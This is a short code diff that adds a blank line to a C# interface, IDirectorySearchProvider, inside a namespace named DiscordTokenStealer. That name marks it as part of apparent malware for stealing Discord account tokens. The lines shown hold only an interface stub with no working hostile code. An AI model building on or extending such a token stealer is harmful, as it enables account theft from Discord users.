@@ -1,4 +1,5 @@
 ﻿namespace DiscordTokenStealer.DirectorySearchProviders;
+
 public interface IDirectorySearchProvider
 {
     public string Directory { get; }
